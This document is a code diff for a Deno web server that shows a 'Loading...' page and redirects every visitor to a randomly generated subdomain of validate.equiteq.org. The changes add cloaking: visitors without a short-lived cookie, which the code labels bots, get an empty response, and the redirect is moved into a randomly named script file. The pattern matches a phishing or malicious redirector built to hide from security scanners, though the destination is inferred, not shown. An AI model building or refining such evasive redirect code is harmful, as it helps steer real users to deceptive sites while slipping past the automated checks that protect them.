@@ -1,29 +1,53 @@
 Deno.serve({ port: 8080 }, (request: Request): Response => {
   try {
     const url = new URL(request.url);
-    const currentPath = url.pathname;
-    const queryString = url.search;
+    const cookies = request.headers.get('cookie') || '';
+    
+    // Check if this is a script request (ends with .js)
+    if (url.pathname.endsWith('.js')) {
+      // No cookie = bot, return empty response
+      if (!cookies.includes('_v=1')) {
+        return new Response('', { status: 204 });
+      }
+
+      const currentPath = url.searchParams.get('p') || '/';
+      const queryString = url.searchParams.get('q') || '';
+
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let sub = '';
+      for (let i = 0; i < 5; i++) {
+        sub += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+
+      const destination = `https://details${sub}.validate.equiteq.org${currentPath}?q=a${queryString ? '&' + queryString : ''}`;
+
+      const js = `window.location.replace('${destination}');`;
+
+      return new Response(js, {
+        headers: { 
+          'Content-Type': 'application/javascript',
+          'Cache-Control': 'no-store'
+        }
+      });
+    }
+
+    // Generate random script filename
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let randomName = '';
+    for (let i = 0; i < 8; i++) {
+      randomName += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+
+    const scriptUrl = `/${randomName}.js?p=${encodeURIComponent(url.pathname)}&q=${encodeURIComponent(url.search.substring(1))}`;
 
     const html = `<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <meta name="robots" content="noindex, nofollow">
   <title>Loading...</title>
 </head>
 <body>
-  <noscript>Please enable JavaScript to continue.</noscript>
-  <script>
-    (function() {
-      var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      var sub = '';
-      for (var i = 0; i < 5; i++) {
-        sub += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      var dest = 'https://details' + sub + '.validate.equiteq.org${currentPath}?q=a${queryString ? '&' + queryString.substring(1) : ''}';
-      window.location.replace(dest);
-    })();
-  </script>
+  <script src="${scriptUrl}"></script>
 </body>
 </html>`;
 
@@ -31,12 +55,13 @@ Deno.serve({ port: 8080 }, (request: Request): Response => {
       status: 200,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-store, no-cache, must-revalidate'
+        'Cache-Control': 'no-store',
+        'Set-Cookie': '_v=1; Path=/; HttpOnly; SameSite=Strict; Max-Age=60'
       }
     });
 
   } catch (error) {
-    console.error("Error:", error);
-    return new Response("Internal Server Error", { status: 500 });
+    console.error('Error:', error);
+    return new Response('Error', { status: 500 });
   }
 });
